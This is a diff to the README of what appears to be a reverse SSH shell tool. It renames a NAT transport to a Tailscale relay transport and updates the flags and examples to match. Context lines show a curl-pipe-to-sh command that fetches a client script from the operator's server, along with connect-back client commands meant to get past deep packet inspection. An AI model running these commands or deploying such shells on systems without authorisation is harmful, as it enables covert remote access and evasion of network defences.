@@ -54,7 +54,7 @@ https://github.com/user-attachments/assets/11dc8d14-59f1-4bdd-9503-b70f8a0d2db1
     - [Privileges](#privileges)
     - [Automatic connect-back](#automatic-connect-back)
     - [Reverse shell download (client generation and in-built HTTP server)](#reverse-shell-download-client-generation-and-in-built-http-server)
-    - [Alternate Transports (HTTP/Websockets/TLS/NAT)](#alternate-transports-httpwebsocketstlsnat)
+    - [Alternate Transports (HTTP/Websockets/TLS/TS Relay)](#alternate-transports-httpwebsocketstlsts-relay)
     - [Bash autocomplete](#bash-autocomplete)
     - [Windows DLL Generation](#windows-dll-generation)
     - [SSH Subsystems](#ssh-subsystems)
@@ -214,7 +214,7 @@ This requires the web server component has been enabled.
         --goos  Set the target build operating system (default runtime GOOS)
         --http  Use http polling as the underlying transport
         --https Use https polling as the underlying transport
-        --nat   Use native NAT transport (direct QUIC + relay fallback) as the underlying transport
+        --ts    Use Tailscale relay transport as the underlying transport
         --log-level     Set default output logging levels, [INFO,WARNING,ERROR,FATAL,DISABLED]
         --lzma  Use lzma compression for smaller binary at the cost of overhead at execution (requires upx flag to be set)
         --name  Set the link download url/filename (default random characters)
@@ -262,7 +262,7 @@ The RSSH server also supports `.sh`, `.py` and `.ps1` URL path endings which wil
 curl http://your.rssh.server.internal:3232/test.sh | sh
 ```
 
-### Alternate Transports (HTTP/Websockets/TLS/NAT)
+### Alternate Transports (HTTP/Websockets/TLS/TS Relay)
 The reverse SSH server and client both support multiple transports for when deep packet inspection blocks SSH outbound from a host or network. 
 You can either specify the connect back scheme manually by specifying it as a url in the client. 
 
@@ -271,21 +271,21 @@ E.g
 ./client -d ws://your.rssh.server:3232
 ```
 
-For native NAT transport:
+For TS relay transport:
 ```sh
-# Server must be started with --nat enabled
-./server --nat 0.0.0.0:3232
+# No server transport flag is needed. The relay is initialised on first `link --ts`.
+./server 0.0.0.0:3232
 
 # Manual destination
-./client -d nat://<token>
+./client -d ts://<token>
 ```
 
 Or by baking it in with the `link` command. 
 ```sh
 ssh your.rssh.server -p 3232 link --ws --name test
 
-# NAT baked client
-ssh your.rssh.server -p 3232 link --nat --name nat-client
+# TS relay baked client
+ssh your.rssh.server -p 3232 link --ts --name ts-client
 ```
 
 ### Bash autocomplete
